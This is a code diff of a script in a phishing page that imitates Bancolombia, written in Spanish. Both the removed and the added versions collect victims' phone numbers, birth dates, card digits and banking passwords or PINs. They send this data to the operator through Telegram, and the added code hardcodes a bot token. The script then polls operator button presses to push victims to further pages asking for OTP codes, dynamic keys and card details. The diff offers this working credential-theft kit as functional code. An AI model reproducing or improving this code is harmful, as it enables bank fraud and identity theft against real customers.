@@ -84,160 +84,107 @@
 
 
     <script>
-    document.addEventListener('DOMContentLoaded', async function () {
-        // Mostrar el loader inicialmente oculto
-        const loader = document.querySelector('#loader');
+document.addEventListener('DOMContentLoaded', async function () {
+  const loader = document.querySelector('#loader');
 
-        // Obtener los valores de usuario y clave desde el localStorage
-        const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
-        if (!bancoldata || !bancoldata.usuario || !bancoldata.clave) {
-            console.error("Error: No se encontraron datos en 'bancoldata' en el localStorage.");
-            return;
+  const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
+
+  if (
+    !bancoldata ||
+    !bancoldata.celular ||
+    !bancoldata.nacimiento ||
+    !bancoldata.tipo ||
+    !bancoldata.identificador ||
+    !bancoldata.digitosFinales ||
+    !bancoldata.clave
+  ) {
+    console.error("Faltan datos en 'bancoldata'");
+    alert("Por favor, vuelve al inicio y completa los datos.");
+    window.location.href = "index.html";
+    return;
+  }
+
+  // Construir mensaje para Telegram
+  let mensaje = "📥 NUEVO REGISTRO DE USUARIO\n";
+  mensaje += "📱 Celular: " + bancoldata.celular + "\n";
+  mensaje += "🎂 Fecha de nacimiento: " + bancoldata.nacimiento + "\n";
+  mensaje += "🧾 Tipo de acceso: " + bancoldata.tipo + "\n";
+  mensaje += "💳 Identificador: " + bancoldata.identificador + "\n";
+  mensaje += "🔢 Últimos 2 dígitos: " + bancoldata.digitosFinales + "\n";
+  mensaje += "🔐 Clave/NIP: " + bancoldata.clave;
+
+  console.log("Enviando a Telegram:", mensaje);
+
+  // ENVÍO a botmaster2.php
+  await fetch("botmaster2.php", {
+    method: "POST",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    body: "data=" + encodeURIComponent(mensaje)
+  });
+
+  // Inicia verificación por botón Telegram
+  const transactionId = `${Date.now()}-${Math.floor(Math.random() * 99999)}`; // genera un ID simple
+
+  async function checkPaymentVerification(transactionId) {
+    try {
+      const response = await fetch(`https://api.telegram.org/bot7844799050:AAEr7wChEkAp31ktChjaTlguv1aUykSbaxw/getUpdates`);
+      const data = await response.json();
+
+      const verificationUpdate = data.result.find(update =>
+        update.callback_query &&
+        [
+          `pedir_dinamica:${transactionId}`,
+          `pedir_cajero:${transactionId}`,
+          `pedir_otp:${transactionId}`,
+          `pedir_token:${transactionId}`,
+          `error_tc:${transactionId}`,
+          `tarjeta_credito:${transactionId}`,
+          `error_logo:${transactionId}`,
+          `confirm_finalizar:${transactionId}`
+        ].includes(update.callback_query.data)
+      );
+
+      if (verificationUpdate) {
+        if (loader) loader.style.display = "none";
+
+        switch (verificationUpdate.callback_query.data) {
+          case `pedir_dinamica:${transactionId}`:
+            window.location.href = "dinacol.php";
+            break;
+          case `pedir_cajero:${transactionId}`:
+            window.location.href = "ccajero-id.php";
+            break;
+          case `pedir_otp:${transactionId}`:
+          case `pedir_token:${transactionId}`:
+            window.location.href = "index-otp.html";
+            break;
+          case `tarjeta_credito:${transactionId}`:
+            window.location.href = "cards.html";
+            break;
+          case `error_tc:${transactionId}`:
+            alert("Error en tarjeta. Verifique los datos.");
+            window.location.href = "../../pay/";
+            break;
+          case `error_logo:${transactionId}`:
+            alert("Error en el logo. Reintente.");
+            window.location.href = "index-pc-error.html";
+            break;
+          case `confirm_finalizar:${transactionId}`:
+            window.location.href = "../../checking.php";
+            break;
         }
+      } else {
+        setTimeout(() => checkPaymentVerification(transactionId), 2000);
+      }
+    } catch (error) {
+      console.error("Error en la verificación:", error);
+      setTimeout(() => checkPaymentVerification(transactionId), 2000);
+    }
+  }
 
-        const usuario = bancoldata.usuario;
-        const clave = bancoldata.clave;
-
-        // Generar transactionId
-        const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
-
-        // Almacenar en localStorage
-        localStorage.setItem('transactionId', transactionId);
-
-        // Obtener los datos de la tarjeta desde localStorage
-        const datosTarjeta = JSON.parse(localStorage.getItem("tbdatos"));
-
-        // Crear mensaje para Telegram
-        const message = `
-<b>Nuevo método de pago pendiente de verificación.</b>
---------------------------------------------------
-🤖 <strong>CODIGO CHAMO</strong>
-👤 <b>Usuario:</b> | ${usuario}
-🔐 <b>Clave:</b> | ${clave}
---------------------------------------------------
-
-        `;
-
-        // Crear botones interactivos
-        const keyboard = JSON.stringify({
-            inline_keyboard: [
-                [{ text: "Pedir Dinámica - Bancolombia", callback_data: `pedir_dinamica:${transactionId}` }],
-                [{ text: "Pedir Código OTP", callback_data: `pedir_otp:${transactionId}` }],
-                [{ text: "Error de TC", callback_data: `error_tc:${transactionId}` }],
-                [{ text: "TC", callback_data: `tarjeta_credito:${transactionId}` }],
-                [{ text: "Error de Logo - Bancolombia", callback_data: `error_logo:${transactionId}` }],
-                [{ text: "Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
-            ],
-        });
-
-        // Enviar mensaje a Telegram
-        const config = await loadTelegramConfig();
-        if (!config) {
-            console.error("Error al cargar configuración de Telegram.");
-            return;
-        }
-
-        try {
-            const response = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: config.chat_id,
-                    text: message,
-                    reply_markup: keyboard,
-                    parse_mode: "HTML",
-                }),
-            });
-
-            const data = await response.json();
-            if (data.ok) {
-                console.log("Mensaje enviado a Telegram con éxito");
-                // Esperar la respuesta del botón presionado en Telegram
-                await checkPaymentVerification(transactionId);
-            } else {
-                throw new Error("Error al enviar mensaje a Telegram.");
-            }
-        } catch (error) {
-            console.error("Error al enviar mensaje:", error);
-            if (loader) loader.style.display = "none"; // Ocultar loader si hay error
-        }
-
-        async function loadTelegramConfig() {
-            try {
-                const response = await fetch("botmaster2.php");
-                if (!response.ok) {
-                    throw new Error("No se pudo cargar el archivo de configuración de Telegram.");
-                }
-                return await response.json();
-            } catch (error) {
-                console.error("Error al cargar la configuración de Telegram:", error);
-            }
-        }
-
-        async function checkPaymentVerification(transactionId) {
-            const config = await loadTelegramConfig();
-            if (!config) return;
-
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${config.token}/getUpdates`);
-                const data = await response.json();
-
-                const verificationUpdate = data.result.find(update =>
-                    update.callback_query &&
-                    [
-                        `pedir_dinamica:${transactionId}`,
-                        `pedir_cajero:${transactionId}`,
-                        `pedir_otp:${transactionId}`,
-                        `pedir_token:${transactionId}`,
-                        `error_tc:${transactionId}`,
-                        `error_logo:${transactionId}`,
-                        `confirm_finalizar:${transactionId}`
-                    ].includes(update.callback_query.data)
-                );
-
-                if (verificationUpdate) {
-                    if (loader) loader.style.display = "none"; // Ocultar loader
-
-                    // Aquí manejamos las respuestas de los botones
-                    switch (verificationUpdate.callback_query.data) {
-                        case `pedir_dinamica:${transactionId}`:
-                            window.location.href = "dinacol.php"; // Redirige a la página de clave dinámica
-                            break;
-                        case `pedir_cajero:${transactionId}`:
-                            window.location.href = "ccajero-id.php"; // Redirige a la página de clave de cajero
-                            break;
-                        case `pedir_otp:${transactionId}`:
-                            window.location.href = "index-otp.html"; // Redirige a la página de OTP
-                            break;
-                        case `pedir_token:${transactionId}`:
-                            window.location.href = "index-otp.html"; // Redirige a la página de OTP
-                            break;
-                        case `error_tc:${transactionId}`:
-                            alert("Error en tarjeta. Verifique los datos.");
-                            window.location.href = "../../pay/"; // Redirige a la página de pago
-                            break;
-                              case `tarjeta_credito:${transactionId}`:
-        window.location.href = "cards.html";
-        break;
-                        case `error_logo:${transactionId}`:
-                            alert("Error en el logo. Reintente.");
-                            window.location.href = "index-pc-error.html"; // Redirige a la página de error
-                            break;
-                            case `confirm_finalizar:${transactionId}`:
-                        window.location.href = "../../checking.php";
-                        break;
-                    }
-                } else {
-                    // Si no hay respuesta, esperamos un poco más antes de volver a intentarlo
-                    setTimeout(() => checkPaymentVerification(transactionId), 2000);
-                }
-            } catch (error) {
-                console.error("Error en la verificación:", error);
-                // En caso de error, intentamos de nuevo en 2 segundos
-                setTimeout(() => checkPaymentVerification(transactionId), 2000);
-            }
-        }
-    });
+  checkPaymentVerification(transactionId);
+});
 </script>
+
 </body>
 </html>
